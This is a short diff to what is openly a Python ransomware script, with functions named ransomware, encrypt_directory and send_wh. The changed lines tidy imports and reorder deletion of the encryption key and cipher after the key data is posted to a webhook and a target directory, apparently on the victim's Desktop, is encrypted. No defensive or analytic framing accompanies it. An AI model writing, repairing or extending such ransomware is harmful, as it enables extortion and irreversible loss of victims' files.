@@ -1,10 +1,7 @@
 import os
 import random
 import string
-import sys
-import subprocess
 import requests
-import shutil
 import datetime
 import errno
 from cryptography.fernet import Fernet
@@ -127,9 +124,10 @@ def send_wh():
 
     try:
         requests.post(webhook_url, json=data)
-        del key
     except Exception:
         pass
+
+    del key
 
 def encrypt_file(file_path):
     encryptedfiles.append(file_path)
@@ -172,8 +170,8 @@ def ransomware():
 
     send_wh()
     encrypt_directory(target_directory)
-    del cipher_suite
     encrypted_files()
+    del cipher_suite
 
     try:
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
